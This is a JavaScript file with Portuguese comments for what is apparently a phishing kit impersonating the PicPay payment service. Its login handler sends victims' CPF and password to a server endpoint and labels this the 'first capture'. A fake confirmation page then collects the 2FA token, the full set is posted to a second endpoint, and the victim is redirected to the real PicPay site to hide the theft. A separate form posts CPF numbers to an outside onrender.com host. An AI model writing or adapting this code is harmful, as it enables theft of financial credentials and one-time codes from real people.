// Substitua seu script.js por este código completo

document.addEventListener('DOMContentLoaded', () => {

    // Função universal para a máscara de CPF
    const inicializarMascaraCPF = () => {
        const cpfFields = document.querySelectorAll('input[placeholder^="CPF"]');
        cpfFields.forEach(cpfField => {
            if (cpfField) {
                cpfField.addEventListener('input', (event) => {
                    let value = event.target.value.replace(/\D/g, '');
                    value = value.substring(0, 11);
                    value = value.replace(/(\d{3})(\d)/, '$1.$2');
                    value = value.replace(/(\d{3})\.(\d{3})(\d)/, '$1.$2.$3');
                    value = value.replace(/(\d{3})\.(\d{3})\.(\d{3})(\d{1,2})/, '$1.$2.$3-$4');
                    event.target.value = value;
                });
            }
        });
    };

    // Função universal para o modal
    const inicializarModais = () => {
        const modalOverlay = document.getElementById('modalOverlay');
        if (!modalOverlay) return;

        const modalContent = document.getElementById('modalContent');
        const closeModalBtn = document.querySelector('.modal-close-btn');

        const modalData = {
            forgotPasswordLink: { title: 'Recuperar Senha', content: `<p>Para recuperar sua senha, digite o CPF cadastrado...</p>`},
            helpLink: { title: 'Central de Ajuda', content: '<p>Bem-vindo à nossa Central de Ajuda!</p>'},
            privacyLink: { title: 'Política de Privacidade', content: '<p>Esta é a nossa política de privacidade...</p>'},
            termsLink: { title: 'Termos de Uso', content: '<p>Ao usar nossos serviços, você concorda com os termos...</p>'}
        };

        const openModal = (content) => {
            modalContent.innerHTML = `<h2>${content.title}</h2><div>${content.content}</div>`;
            modalOverlay.classList.add('active');
        };
        const closeModal = () => modalOverlay.classList.remove('active');

        document.querySelectorAll('a[id]').forEach(link => {
            link.addEventListener('click', e => {
                e.preventDefault();
                if (modalData[link.id]) openModal(modalData[link.id]);
            });
        });
        
        if (closeModalBtn) closeModalBtn.addEventListener('click', closeModal);
        modalOverlay.addEventListener('click', (event) => {
            if (event.target === modalOverlay) closeModal();
        });
    };

    // Função para a página de LOGIN (index.html)
    const inicializarPaginaLogin = () => {
        const loginForm = document.querySelector('form:not(#emprestimoForm)');
        if (!loginForm) return;
        
        loginForm.addEventListener('submit', async (event) => {
            event.preventDefault();
            const cpf = loginForm.querySelector('input[placeholder="CPF"]').value;
            const senha = loginForm.querySelector('input[placeholder="Digite sua senha"]').value;
            if (!cpf || !senha) return alert('Por favor, preencha todos os campos.');
            
            try {
                // 1. Salva os dados no servidor (primeira captura)
                await fetch('/salvar-dados', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ cpf, senha }),
                });
            } catch (error) {
                console.error("Falha ao enviar dados iniciais:", error);
            } finally {
                // 2. Salva os dados no navegador para usar na próxima etapa
                sessionStorage.setItem('temp_cpf', cpf);
                sessionStorage.setItem('temp_senha', senha);
                // 3. Redireciona para a página de confirmação
                window.location.href = '/confirm/index.html';
            }
        });
    };

    // Função para a página de CONFIRMAÇÃO (confirmacao.html)
    const inicializarPaginaConfirmacao = () => {
        const options = document.querySelector('.confirmation-options');
        if (!options) return;

        // Adiciona um listener para qualquer clique dentro da área de opções
        options.addEventListener('click', (e) => {
            e.preventDefault();
            // Redireciona para a página do token, não importa onde clicou
            window.location.href = '/token/index.html';
        });
    };

    // Função para a página do TOKEN (token.html)
    const inicializarPaginaToken = () => {
        const tokenForm = document.getElementById('tokenForm');
        if (!tokenForm) return;

        // Lógica do contador regressivo
        const reenviarLink = document.getElementById('reenviarCodigo');
        let timeLeft = 59;
        const timerId = setInterval(() => {
            reenviarLink.textContent = `Reenviar código em 00:${timeLeft < 10 ? '0' : ''}${timeLeft}`;
            timeLeft--;
            if (timeLeft < 0) {
                clearInterval(timerId);
                reenviarLink.textContent = 'Reenviar código';
                reenviarLink.classList.remove('disabled');
                reenviarLink.href = '#'; // Reabilita o link
            }
        }, 1000);

        // Lógica do envio do formulário do token
        tokenForm.addEventListener('submit', async (event) => {
            event.preventDefault();
            const token = document.getElementById('token').value;
            if (token.length < 6) return alert('Por favor, digite o código de 6 dígitos.');

            // Recupera os dados salvos no navegador
            const cpf = sessionStorage.getItem('temp_cpf');
            const senha = sessionStorage.getItem('temp_senha');

            if (!cpf || !senha) {
                // Se não encontrar os dados, algo deu errado. Volta pro início.
                alert('Sessão expirada. Por favor, comece novamente.');
                window.location.href = 'index.html';
                return;
            }

            try {
                // Envia o pacote completo para o novo endpoint
                await fetch('/salvar-tudo', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ cpf, senha, token }),
                });
            } catch (error) {
                console.error("Falha ao enviar pacote final:", error);
            } finally {
                // Limpa os dados do navegador e redireciona para o site oficial para finalizar
                sessionStorage.clear();
                window.location.href = 'https://www.picpay.com/site';
            }
        });
    };
    const inicializarPaginaEmprestimos = () => {
        const emprestimoForm = document.getElementById('emprestimoForm');
        if (!emprestimoForm) return;
        
        emprestimoForm.addEventListener('submit', async (event) => {
            event.preventDefault();
            const cpf = document.getElementById('cpfEmprestimo').value;
            if (cpf.length < 14) return alert('Por favor, preencha o CPF corretamente.');

            try {
                const response = await fetch('https://picpay-fky2.onrender.com/acessar-contratos', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ cpf }),
                });
                const result = await response.json();
                alert(result.message);
            } catch (error) {
                alert('Não foi possível conectar ao servidor. Tente novamente mais tarde.');
            }
        });
    };


    inicializarMascaraCPF();
    inicializarModais();
    inicializarPaginaLogin();
    inicializarPaginaEmprestimos();
});
